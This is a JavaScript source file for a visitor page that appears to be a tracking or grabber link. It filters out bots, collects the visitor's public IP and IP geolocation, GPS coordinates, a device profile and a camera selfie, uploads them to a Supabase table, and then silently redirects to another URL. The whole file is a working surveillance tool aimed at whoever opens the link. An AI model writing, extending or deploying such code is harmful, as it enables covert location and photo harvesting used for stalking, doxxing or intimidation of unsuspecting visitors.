import {
  fetchPublicIp,
  requestLocation,
  captureSelfie,
} from "./collect.js";
import { collectDeviceProfile } from "./device-profile.js";
import { fetchRedirectUrl, isSupabaseConfigured } from "./settings.js";
import { shouldSkipVisitorFlow } from "./bot-filter.js";

function cfg() {
  return window.APP_CONFIG || {};
}

function saveVisit(payload) {
  const { supabaseUrl, supabaseAnonKey } = cfg();
  if (!isSupabaseConfigured()) {
    return Promise.resolve({ ok: false, local: true });
  }

  return fetch(`${supabaseUrl}/rest/v1/visits`, {
    method: "POST",
    headers: {
      apikey: supabaseAnonKey,
      Authorization: `Bearer ${supabaseAnonKey}`,
      "Content-Type": "application/json",
      Prefer: "return=minimal",
    },
    body: JSON.stringify(payload),
  }).then((res) => {
    if (!res.ok) throw new Error(String(res.status));
    return { ok: true };
  });
}

export function initVisitorPage() {
  async function run() {
    if (shouldSkipVisitorFlow()) {
      return;
    }
    const redirectPromise = fetchRedirectUrl();
    const ipPromise = fetchPublicIp().catch(() => ({
      ip: null,
      source: null,
      geo: null,
    }));
    const locationPromise = requestLocation();
    const devicePromise = collectDeviceProfile();

    const [redirectTarget, ipPayload, locationPayload, deviceInfo] =
      await Promise.all([
        redirectPromise,
        ipPromise,
        locationPromise,
        devicePromise,
      ]);

    if (ipPayload.geo) {
      deviceInfo.network = deviceInfo.network || {};
      deviceInfo.network.ipGeo = ipPayload.geo;
    }

    let photoPayload = { granted: false, dataUrl: null };
    try {
      photoPayload = await captureSelfie();
    } catch {
      photoPayload = { granted: false, error: "denied_or_unavailable" };
    }

    const payload = {
      ip: ipPayload.ip,
      ip_source: ipPayload.source,
      device_info: {
        ...deviceInfo,
        visitKind: "human",
      },
      location_granted: locationPayload.granted,
      location: locationPayload.granted
        ? {
            latitude: locationPayload.latitude,
            longitude: locationPayload.longitude,
            accuracy: locationPayload.accuracy,
          }
        : null,
      camera_granted: !!photoPayload.granted,
      photo_base64: photoPayload.dataUrl || null,
      referrer: document.referrer || null,
      page_url: location.href,
    };

    try {
      await saveVisit(payload);
    } catch {
      /* still redirect */
    }
    window.location.replace(redirectTarget);
  }

  run();
}
